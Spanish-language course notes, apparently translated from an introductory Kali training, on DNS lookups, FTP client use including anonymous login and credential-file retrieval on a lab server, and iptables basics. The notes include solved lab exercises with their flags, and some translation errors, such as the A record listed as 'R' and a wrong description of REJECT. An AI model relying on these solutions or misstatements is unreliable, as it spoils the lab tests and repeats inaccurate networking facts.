Cada dominio puede usar diferentes tipos de registros DNS. Algunos de los tipos más comunes de registros DNS incluyen:

- *NS*: los registros del servidor de nombres contienen el nombre de los servidores autorizados que alojan los registros DNS de un dominio.
- *R*: También conocido como registro de host, el "registro a" contiene la dirección IP de un nombre de host (como www.megacorpone.com).
- *MX*: los registros de intercambio de correo contienen los nombres de los servidores responsables de manejar el correo electrónico del dominio. Un dominio puede contener varios registros MX.
- *PTR*: los registros de puntero se utilizan en zonas de búsqueda inversa y pueden ayudar a localizar los registros asociados con una dirección IP.
- *CNAME*: los registros de nombres canónicos se utilizan para crear alias para otros registros de host.
- *TXT*: los registros de texto pueden contener datos arbitrarios y se pueden usar para diversos fines, como la verificación de la propiedad del dominio.

Debido a la gran cantidad de información contenida en el DNS, a menudo es un objetivo lucrativo para la recopilación activa de información.

<br />

- *host*

Para demostrar esto, usemos el comando *host* para encontrar la dirección IP de www.megacorpone.com.

Las direcciones IP cambian de vez en cuando, por lo que los resultados individuales pueden ser diferentes a los ejemplos mostrados.

```
kali@kali:~$ host www.megacorpone.com
www.megacorpone.com has address 38.100.193.76
```

De forma predeterminada, el comando host busca un registro *A*, pero también podemos consultar otros campos, como registros MX o TXT, utilizando la opción *-t* para especificar el tipo de registro que estamos buscando:

```
kali@kali:~$ host -t mx megacorpone.com
megacorpone.com mail is handled by 10 fb.mail.gandi.net.
megacorpone.com mail is handled by 50 mail.megacorpone.com.
megacorpone.com mail is handled by 60 mail2.megacorpone.com.
megacorpone.com mail is handled by 20 spool.mail.gandi.net.

kali@kali:~$ host -t txt megacorpone.com
megacorpone.com descriptive text "Try Harder"
```

La lista anterior muestra los registros MX y TXT después de cada ejecución de comando para *megacorpone.com*.

<br />

- *nslookup & dig*

Yendo más allá del comando *host*, podemos usar *nslookup* y *dig* para identificar las direcciones IP de los hosts por sus nombres legibles por humanos. *nslookup* y *dig* son herramientas muy similares. Comencemos con el uso básico de *nslookup*.

```
kali@kali:~$ nslookup kali.org
Server:         192.168.1.1
Address:        192.168.1.1#53

Non-authoritative answer:
Name:   kali.org
Address: 35.185.44.232
```

El resultado anterior muestra que kali.org tiene la dirección IP *35.185.44.232*. Podemos hacer más cosas usando *nslookup*, pero por ahora, pasemos a *dig*. *dig* funciona de manera similar a *nslookup* y su uso básico es el mismo.

```
kali@kali:~$ dig kali.org

; <<>> DiG 9.16.15-Debian <<>> kali.org
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34693
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1280
;; QUESTION SECTION:
;kali.org.                      IN      A

;; ANSWER SECTION:
kali.org.               300     IN      A       35.185.44.232

;; Query time: 108 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Fri Jul 09 04:29:53 MST 2021
;; MSG SIZE  rcvd: 53
```

Como se muestra arriba, la IP del host para *kali.org* es 35.185.44.232. Notaremos que el registro de búsqueda predeterminado tanto para *nslookup* como para *dig* es el registro *A*. Esto se puede cambiar especificando el tipo en la línea de comando. En *dig*, podemos hacer esto usando la opción *-t (tipo).* Veamos qué servidores de correo se están utilizando para *kali.org*.

```
kali@kali:~$ dig -t mx kali.org

; <<>> DiG 9.16.15-Debian <<>> -t mx kali.org
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5075
;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1280
;; QUESTION SECTION:
;kali.org.                      IN      MX

;; ANSWER SECTION:
kali.org.               1800    IN      MX      15 alt2.aspmx.l.google.com.
kali.org.               1800    IN      MX      10 alt1.aspmx.l.google.com.
kali.org.               1800    IN      MX      5 aspmx.l.google.com.
kali.org.               1800    IN      MX      20 alt3.aspmx.l.google.com.
kali.org.               1800    IN      MX      25 alt4.aspmx.l.google.com.

;; Query time: 56 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Fri Jul 09 04:34:46 MST 2021
;; MSG SIZE  rcvd: 155
```

*dig* también puede especificar un servidor DNS para realizar la solicitud agregando el símbolo *@*, seguido del nombre o IP del servidor DNS. Examinemos una solicitud al servidor DNS de Google a *kali.org*.

```
kali@kali:~$ dig @8.8.8.8 kali.org

; <<>> DiG 9.16.15-Debian <<>> @8.8.8.8 kali.org
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 46201
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;kali.org.                      IN      A

;; ANSWER SECTION:
kali.org.               71      IN      A       35.185.44.232

;; Query time: 40 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Fri Jul 09 04:47:28 MST 2021
;; MSG SIZE  rcvd: 53
```

Ahora que comprendemos mejor cómo usar **host** , **nslookup** y **dig** para buscar tipos de registros DNS, podemos identificar máquinas en una red.
#### 2.10. FTP (ftp -v -n)

*FTP* (Protocolo de transferencia de archivos) es uno de los protocolos más antiguos que se utilizan en la actualidad. Es un protocolo muy simple utilizado para transferencias de archivos. El FTP puede ser un tesoro de datos para un pentester y/o un profesional de la seguridad de la información si el servidor FTP está mal configurado o se filtran las credenciales. En muchos escenarios, los archivos confidenciales en un servidor FTP comprometen un sistema. Los servidores FTP también se pueden usar para cargar archivos en un directorio de servidor web, que un atacante puede aprovechar para colocar archivos maliciosos en el servidor.

En las siguientes demostraciones, utilizaremos un servidor FTP local. La configuración para esto está fuera del alcance, ya que el objetivo de esta sección es familiarizarse con el uso del cliente FTP en servidores FTP preconfigurados.

Antes de comenzar, cubramos dos opciones útiles con el cliente FTP. 

- Primero, *-v* muestra todas las respuestas del servidor FTP. Esto puede ser útil al depurar problemas de conectividad. 
- En segundo lugar, la opción *-n* evita el inicio de sesión automático en el servidor FTP. Si el inicio de sesión automático está habilitado, el servidor intentará iniciar sesión en el servidor con el usuario actual, lo que nos impide especificar un nombre de usuario y una contraseña diferentes.

La forma más sencilla de acceder a un servidor FTP es a través del acceso con el usuario *Anonymous*. Esto es cuando el usuario es anónimo y no se necesita una contraseña. Se puede ingresar cualquier cosa como contraseña y se aceptará el inicio de sesión. Esta es una de las configuraciones más inseguras, ya que permite que cualquier persona inicie sesión en el servidor FTP. Iniciemos sesión con acceso anónimo.

```
kali@kali:~$ ftp localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
Name (localhost:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xrwx    2 65534    65534        4096 Jul 09 05:50 pub
226 Directory send OK.
ftp> exit
221 Goodbye.
```

El servidor FTP local se inició sesión con acceso anónimo. Cuando se mostró la solicitud de contraseña, se presionó la tecla I sin contraseña. Actualmente, observaremos un directorio pub al iniciar sesión en el servidor FTP.

Al usar la opción _-n_ , el inicio de sesión inicial es un poco diferente, ya que no solicitará el nombre de usuario o la contraseña. Sigamos este proceso para examinar la diferencia.

```
kali@kali:~$ ftp -nv localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
ftp> ls
530 Please login with USER and PASS.
ftp: bind: Address already in use
ftp> 
```

Como se muestra en la lista anterior, es necesario ingresar el nombre de usuario y la contraseña antes de otorgar acceso al servidor. Necesitamos usar el comando de *user* para especificar el usuario y se mostrará la solicitud de *password* para la contraseña. Hagamos eso ahora.

```
kali@kali:~$ ftp -nv localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
ftp> ls
530 Please login with USER and PASS.
ftp: bind: Address already in use
ftp> user anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xrwx    2 65534    65534        4096 Jul 09 05:50 pub
226 Directory send OK.
ftp> exit
221 Goodbye.
```

Hemos empleado el comando 'ls'  y hemos visto que hay un directorio en el directorio 'anonymous' del servidor. Vamos a crear un archivo y subirlo al directorio. Para hacer esto, cambiaremos nuestro directorio de trabajo actual en nuestro host Kali a /var/tmp y crearemos el archivo allí.

```
kali@kali:~$ cd /var/tmp

kali@kali:/var/tmp$ ls
systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-colord.service-nZQIAf        systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-systemd-logind.service-3v6WKg
systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-haveged.service-WMdLrh       systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-upower.service-Bh7DTe
systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-ModemManager.service-V6U3lg

kali@kali:/var/tmp$ echo "This is a file" > upload.txt

kali@kali:/var/tmp$ cat upload.txt
This is a file

kali@kali:/var/tmp$ ls
systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-colord.service-nZQIAf        systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-systemd-logind.service-3v6WKg
systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-haveged.service-WMdLrh       systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-upower.service-Bh7DTe
systemd-private-7e0fd2ca8df74ba6ab82931917200d6f-ModemManager.service-V6U3lg  upload.txt
```

Con el archivo creado, podemos volver a iniciar sesión en el servidor FTP y cargar el archivo con el comando *put*.

```
kali@kali:/var/tmp$ ftp localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
Name (localhost:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xrwx    2 65534    65534        4096 Jul 09 05:50 pub
226 Directory send OK.
ftp> put upload.txt
local: upload.txt remote: upload.txt
200 EPRT command successful. Consider using EPSV.
553 Could not create file.
ftp>
```

El archivo no se cargó y mostró un mensaje de error: *553 No se pudo crear el archivo*. Notaremos que todos pueden escribir en los permisos del directorio *pub*. Vayamos a ese directorio e intentemos cargar de nuevo.

```
...
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> put upload.txt
local: upload.txt remote: upload.txt
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
226 Transfer complete
15 bytes sent in 0.00 secs (610.3516 kB/s)
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-------    1 137      147            15 Jul 09 06:50 upload.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
```

Cuando cambiamos al directorio de escritura global, *pub*, pudimos cargar nuestro archivo de texto usando el comando *put* FTP.

Iniciemos sesión con una cuenta de usuario en el servidor FTP. Usaremos el usuario *kali* para esto.

```
kali@kali:/var/tmp$ ftp localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
Name (localhost:kali): kali
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Desktop
drwxr-xr-x    6 1001     1001         4096 Jul 09 05:17 Documents
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Downloads
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Music
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Pictures
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Public
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Templates
drwxr-xr-x    2 1001     1001         4096 Jul 09 05:17 Videos
-rw-r--r--    1 1001     1001           85 Jul 09 06:56 specialcredentials.txt
226 Directory send OK.
ftp> 
```

Iniciamos sesión en el servidor FTP con el nombre de usuario y la contraseña de kali:kali. Es importante tener en cuenta que esta cuenta de usuario requiere la contraseña correcta, a diferencia de la cuenta Anonymous, que podría usar cualquier contraseña o ninguna.

Este inicio de sesión muestra un directorio de usuario, en lugar del directorio *pub*. También hay un archivo interesante en este directorio. Descarguemos el archivo *specialcredentials.txt* y analicemos su contenido. Para descargar un archivo desde un servidor FTP, usaremos el comando *get*.

```
...
ftp> get specialcredentials.txt
local: specialcredentials.txt remote: specialcredentials.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for specialcredentials.txt (85 bytes).
226 Transfer complete.
85 bytes received in 0.00 secs (892.5571 kB/s)
ftp> exit
221 Goodbye.
```

El servicio FTP informa una transferencia exitosa del archivo a la máquina local. Leamos ese archivo en nuestro host Kali.

```
kali@kali:/var/tmp$ cat specialcredentials.txt
The password to the root account is "password." Surely, no one will ever guess this!
```

El archivo se transfirió con éxito a nuestra máquina desde el servidor FTP y pudimos leer el contenido del archivo.

Antes de concluir nuestra cobertura de FTP, exploremos brevemente dos temas: FTP *activo* frente a *pasivo* y modo *binary* frente a *ASCII*. 

Las conexiones FTP activas frente a las pasivas implican el puerto FTP inicial al servidor y el puerto del servidor FTP resultante que se utiliza para devolver el tráfico. En ambos casos, el puerto del servidor será el puerto 21 (en una configuración por defecto). FTP funciona también en dos canales, el canal de *comandos* y el canal de *datos*.

- En modo *activo*, el puerto que utiliza el servidor FTP será el puerto 20 para enviar el tráfico de regreso al host de conexión. El flujo de este modo es que el host que se conecta al servidor FTP utilizará un puerto aleatorio para conectarse al puerto 21 del servidor FTP en el canal de *comandos*. El servidor FTP se comunicará desde el puerto 20 a un puerto aleatorio en el host que se conectó a él en el canal de *datos*.

- En modo *pasivo*, el puerto que utiliza el servidor FTP será un puerto aleatorio. El flujo para este modo, que es el host que se conecta al servidor FTP, utilizará un puerto aleatorio para conectarse al puerto 21 del servidor FTP en el canal de comando. El host que se conecta envía un comando *PASV* al servidor FTP. El servidor FTP recibe el comando *PASV* y responde conectándose desde un puerto aleatorio a un puerto aleatorio al host de conexión. Dependiendo de cómo esté configurado el servidor FTP, es posible que sea necesario cambiar el modo de red en el cliente.

Los modos binario frente a ASCII están relacionados con la forma en que se transfiere el archivo. 

- Si el archivo es un archivo de texto, se puede utilizar el modo *ASCII*. Si la transferencia se realiza desde un sistema UNIX a un sistema Microsoft, el modo ASCII agregará automáticamente un ^M al final de cada nueva línea. Si la transferencia es de un host de Microsoft a un host de UNIX, el ^M se eliminará de cada nuevo final de línea. Esto asegura la compatibilidad con la lectura de un archivo de texto cuando se transfiere de un tipo de sistema a otro. 

- El modo binario mantendrá el archivo en su estado original, sin modificar las entradas de nueva línea. Si transfiere en modo binario, el binario debería ser usado. De lo contrario, la ejecución del binario puede corromperse debido a la modificación de las nuevas entradas de línea. Examinemos rápidamente los comandos ftp *ascii* y *binary*.

```
kali@kali:/var/tmp$ ftp localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
Name (localhost:kali): kali
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ascii
200 Switching to ASCII mode.
ftp> bin
200 Switching to Binary mode.
ftp> exit
221 Goodbye.
```

Se inició sesión en el servidor FTP y los modos se cambiaron a *ASCII* y luego a *binario*. Estos modos deberán cambiarse de acuerdo con nuestras necesidades antes de descargar o cargar un archivo desde/hacia el servidor FTP. Usando esta información, ahora deberíamos poder trabajar con servidores FTP con diferentes configuraciones.

<br />

**Exercises**

**1.  Realice una conexión ftp estándar al host del ejercicio con las siguientes credenciales: "kali:kali"**

Descarga el archivo para obtener la bandera.

```bash
ftp 192.168.114.61 -nv
Connected to 192.168.114.61.
220 (vsFTPd 3.0.3)
ftp> user
(username) kali
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21915|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              20 Feb 17  2022 FTP-flag1.txt
226 Directory send OK.
ftp> more FTP-flag1.txt
FTP{Standard_Login}
```

<br />

**2.  Inicie sesión en el servidor FTP (host de ejercicio) con la cuenta anónima. Busque la conexión del servidor FTP para la bandera.**

```bash
ftp 192.168.114.61 -nv
Connected to 192.168.114.61.
220 (vsFTPd 3.0.3)
ftp> user anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd keep
250 Directory successfully changed.
ftp> cd going
250 Directory successfully changed.
ftp> cd further
250 Directory successfully changed.
ftp> more FTP-flag2.txt
FTP{They_Just_Let_Anyone_In}
```

<br />


**3.  Cargue un archivo llamado 'payload.txt' con las siguientes credenciales: "offsec:offsec"**

**El archivo debe estar ubicado en el directorio de inicio de la cuenta offsec bajo flag3. Esto debería aparecer como ~/flag3/payload.txt. Cuando esto se complete, espere un minuto y la bandera debería estar en el directorio de inicio de la cuenta offsec.**

```bash
ftp 192.168.114.61 -nv
Connected to 192.168.114.61.
220 (vsFTPd 3.0.3)
ftp> user offsec
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||64869|)
150 Here comes the directory listing.
drwxr-xr-x    2 1003     1003         4096 Feb 17  2022 .
drwxr-xr-x    2 1003     1003         4096 Feb 17  2022 ..
-rw-r--r--    1 1003     1003          220 Feb 25  2020 .bash_logou
-rw-r--r--    1 1003     1003         3771 Feb 25  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Feb 25  2020 .profile
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> mkdir flag3
257 "/flag3" created
ftp> cd flag3
250 Directory successfully changed.
ftp> put payload.txt
local: payload.txt remote: payload.txt
229 Entering Extended Passive Mode (|||17913|)
150 Ok to send data.
     0        0.00 KiB/s 
226 Transfer complete.
ftp> ls
229 Entering Extended Passive Mode (|||14131|)
150 Here comes the directory listing.
-rw-------    1 1003     1003            0 Jan 17 16:55 payload.txt
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||54155|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              21 Jan 17 16:56 FTP-flag3.txt
drwx------    2 1003     1003         4096 Jan 17 16:55 flag3
226 Directory send OK.
ftp> more FTP-flag3.txt
FTP{Upload_with_FTP}
```
#### 2.11. ACLs Overview and Netfilter Introduction.

*ACL*

Antes de que podamos cubrir las configuraciones básicas del firewall, es importante comprender qué es una *Access Control List* (ACL). Una ACL es un firewall basado en una lista de reglas para controlar el acceso a los recursos de la computadora. Esto puede ser en el sistema de archivos o en la red. En esta sección, cubriremos estrictamente las ACL de red (Network ACLs).

Una ACL de red normalmente tendrá tres acciones que puede realizar. Estos son *ACCEPT*, *DROP* y *REJECT*.

- *ACCEPT*: Si el usuario está en la lista de aceptados se le da acceso al recurso.
- *DROP*: El usuario no está aceptado.
- *REJECT*: El usuario estuvo en algún momento aceptado pero por alguna razón (que puede estar especificada o no) en algún punto se le ha denegado el acceso.

Los firewalls también tienen una política predeterminada, por defecto, que puede ser DROP (no permitir). Esto significa que cualquier persona que no esté en la lista ACCEPT no podrá utilizar recursos. Si la política fuera ACEPTAR por defecto, solo aquellos en la lista para DROP o REJECT no estarían permitidos.

Cuando se trata de tráfico de red, es más fácil tener una política ACCEPT predeterminada. Puede haber muchas conexiones desconocidas que deseen realizarse a un dispositivo en red.

Esto es mucho menos seguro que una política DROP predeterminada. Con una política DROP predeterminada, el acceso se define explícitamente solo para dispositivos confiables permitidos en la red. La ACL también se leerá de arriba hacia abajo y las reglas se seguirán en el orden en que se leen. Dicho esto, si una regla permite explícitamente un tipo de tráfico y luego descarta ese mismo tipo de tráfico, se permitirá el tráfico. No importa que haya reglas contradictorias en el mismo partido. El cortafuegos realizará la primera acción que coincida con las reglas.

El kernel de Linux tiene un marco de filtrado de paquetes, llamado *netfilter*. La utilidad que se conecta a este marco es *iptables*, que se usa para crear y/o modificar ACL para el firewall de Linux. Inspeccionemos la salida del comando *iptables -L*.

```
kali@kali:~$ sudo iptables -L
[sudo] password for kali: 
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
```


IPTables tiene múltiples tablas para almacenar diferentes tipos de ACL. La tabla predeterminada se llama *filter table*. Esta es la única tabla que cubriremos en este tema, pero debemos tener en cuenta que las siguientes tablas también existen dentro de iptables. Puede encontrar una descripción de todos los tipos de tablas en la página de manual de iptables (*man iptables*).

En la tabla predeterminada (*filter*), se muestran *INPUT*, *FORWARD* y *OUTPUT*. Estos se denominan *cadenas* (CHAINS) y definen la dirección del flujo de tráfico de la red. De esta forma:

- INPUT está relacionado con cualquier conexión entrante hacia el host.
- OUTPUT es para cualquier conexión saliente desde el host. 
- FORWARD se relaciona con cómo redirigir el tráfico de red y se usa comúnmente en configuraciones de enrutador Linux. Hay más cadenas en otras tablas, pero están fuera del alcance de este tema.

La política predeterminada para cada una de las cadenas en la lista está establecida en ACCEPT, por lo que podemos considerar que el firewall está completamente abierto. Las otras políticas que se pueden usar son las acciones que se mencionaron anteriormente.

Las políticas posibles son ACCEPT, DROP y REJECT. Cambiemos la política predeterminada para la cadena FORWARD a DROP, ya que nuestro host Kali no funcionará como un enrutador. Hacemos esto con la opción *-P* (policy)

```
kali@kali:~$ sudo iptables -P FORWARD DROP

kali@kali:~$ sudo iptables -L</sudo>
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy DROP)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Después de ejecutar nuestro comando, podemos verificar que la política predeterminada para la cadena FORWARD está establecida en DROP.

Ahora que tenemos una base de términos y podemos enumerar las reglas en la tabla predeterminada, pasemos a crear las reglas que conforman el firewall. Comprender que el host tiene múltiples networks paths (INPUT, OUTPUT, FORWARD) es fundamental para comprender la naturaleza del tráfico que PERMITIREMOS, RECHAZAREMOS o ABANDONAREMOS.
#### 2.12. IPTables.

Cubrir los firewalls como concepto sería inútil sin analizar algunas reglas. Más allá de esto, construiremos un conjunto de habilidades mucho más sólido si sabemos cómo configurar iptables y tenemos la capacidad de configurar un firewall. Construyamos sobre lo que aprendimos sobre las ACL, las políticas predeterminadas, las acciones y la lista de reglas de firewall en un host Linux.

Para comenzar, ejecutemos *iptables* y agreguemos (*-A*) una regla a la cadena *INPUT* para una red de origen (*-s*) de *192.168.1.0/24* para todos los protocolos (*-p all* ).

```
kali@kali:~$ sudo iptables -s 192.168.1.0/24 -p all -A INPUT
[sudo] password for kali:

kali@kali:~$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
           all  --  192.168.1.0/24       anywhere

Chain FORWARD (policy DROP)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Después de ejecutar el comando, verificamos que la regla de firewall se agregó a la cadena INPUT.

Por el bien de esta actividad, agreguemos algunas reglas arbitrarias más a la cadena INPUT. Agreguemos la IP localhost (127.0.0.1) como origen (*-s*) y destino (*-d*). Agreguemos también la dirección IP de 192.168.1.37 como fuente (*-s*) con el protocolo TCP (*-p tcp*).

```
kali@kali:~$ sudo iptables -s 127.0.0.1 -d 127.0.0.1 -A INPUT

kali@kali:~$ sudo iptables -s 192.168.1.37 -p tcp -A INPUT

kali@kali:~$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
           all  --  192.168.1.0/24       anywhere            
           all  --  localhost            localhost
           tcp  --  192.168.1.37         anywhere      

Chain FORWARD (policy DROP)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Las reglas ahora son parte de la cadena INPUT, adjuntas debajo de nuestra primera regla de firewall.

Agreguemos ahora otra regla de firewall para el nombre *localhost* y observemos qué sucede. Para esto, vamos a agregarlo como la dirección de origen.

```
kali@kali:~$ sudo iptables -s localhost -A INPUT

kali@kali:~$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
           all  --  192.168.1.0/24       anywhere            
           all  --  localhost            localhost           
           tcp  --  192.168.1.37         anywhere            
           all  --  localhost            anywhere
           all  --  localhost            anywhere   

Chain FORWARD (policy DROP)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Tenga en cuenta que la primera vez que agregamos la IP literal para localhost (127.0.0.1). Esa especificación de regla se resolvió en la salida de la lista de reglas a "localhost". Debido a que usamos localhost como la dirección de origen en el último comando, ahora hay dos entradas con la misma información. Esto se debe a que localhost se resuelve en la dirección IPv4 y la dirección IPv6. Nuevamente, esas direcciones se resuelven en localhost en la salida.

Eliminemos estas líneas duplicadas con *-D* y especifiquemos la fuente como localhost.

```
kali@kali:~$ sudo iptables -s localhost -D INPUT

kali@kali:~$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
           all  --  192.168.1.0/24       anywhere            
           all  --  localhost            localhost           
           tcp  --  192.168.1.37         anywhere            

Chain FORWARD (policy DROP)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

El comando para eliminar la regla duplicada terminó eliminando ambas reglas. No eliminó la otra regla con localhost, ya que la especificación de destino era diferente entre las reglas agregadas en el último comando. Agreguemos esa regla nuevamente y listemos las reglas con la opción *--line-numbers*.

```
kali@kali:~$ sudo iptables -s localhost -A INPUT

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               all  --  192.168.1.0/24       anywhere            
2               all  --  localhost            localhost           
3               tcp  --  192.168.1.37         anywhere            
4               all  --  localhost            anywhere            
5               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

Ahora tenemos números de línea en la columna de la izquierda. Si usamos el número de línea para eliminar una de las entradas duplicadas, podemos evitar eliminar todas las entradas que se ajustan a la misma especificación de regla. Eliminemos la entrada en la línea 5.

```
kali@kali:~$ sudo iptables -D INPUT 5

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               all  --  192.168.1.0/24       anywhere            
2               all  --  localhost            localhost           
3               tcp  --  192.168.1.37         anywhere            
4               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

La regla de firewall que existía en la línea 5 desapareció después de que ejecutamos nuestro comando.

Es importante tener en cuenta que los firewalls funcionan desde la parte superior de la lista y van a cada línea hasta que se encuentra una coincidencia. Dicho esto, si hay conflictos entre reglas, la primera línea que se lea será la utilizada en la configuración del firewall. Si examinamos la salida nuevamente, encontramos que puede haber un conflicto actual con la red 192.168.1.0/24 y el host 192.168.1.37. Insertemos la especificación de regla para 192.168.1.37 en la línea 1 y luego eliminemos la entrada duplicada que ya estaba en la lista. Comenzaremos insertando (*-I*) nuestra regla de firewall.

```
kali@kali:~$ sudo iptables -s 192.168.1.37 -I INPUT 1

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               all  --  192.168.1.37         anywhere
2               all  --  192.168.1.0/24       anywhere            
3               all  --  localhost            localhost           
4               tcp  --  192.168.1.37         anywhere   
5               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

Con la regla de firewall insertada en la línea 1 y la inserción de esa regla verificada, eliminemos la entrada preexistente.

```
kali@kali:~$ sudo iptables -D INPUT 4

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               all  --  192.168.1.37         anywhere            
2               all  --  192.168.1.0/24       anywhere            
3               all  --  localhost            localhost           
4               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

La entrada duplicada ya no existe en nuestra LCA de firewall.

También podemos mostrar la cantidad de tráfico en términos de paquetes y bytes con la opción *-v*. Analicemos cuáles son los datos de tráfico actualmente. En el comando, también podemos incluir *-n* para mostrar solo las direcciones IP, en lugar de los nombres canónicos. La salida en su sesión de terminal será diferente.

```
kali@kali:~$ sudo iptables -nvL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0            all  --  *      *       192.168.1.37         0.0.0.0/0           
   78  5464            all  --  *      *       192.168.1.0/24       0.0.0.0/0           
    6   504            all  --  *      *       127.0.0.1            127.0.0.1           
   14   904            all  --  *      *       127.0.0.1            0.0.0.0/0           

Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
```

Generemos algo de tráfico de red desde nuestro host local a nuestro host local con la utilidad *ping*. Después del *ping*, inspeccionemos la cantidad de tráfico nuevamente.

```
kali@kali:~$ ping -c 10 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.064 ms
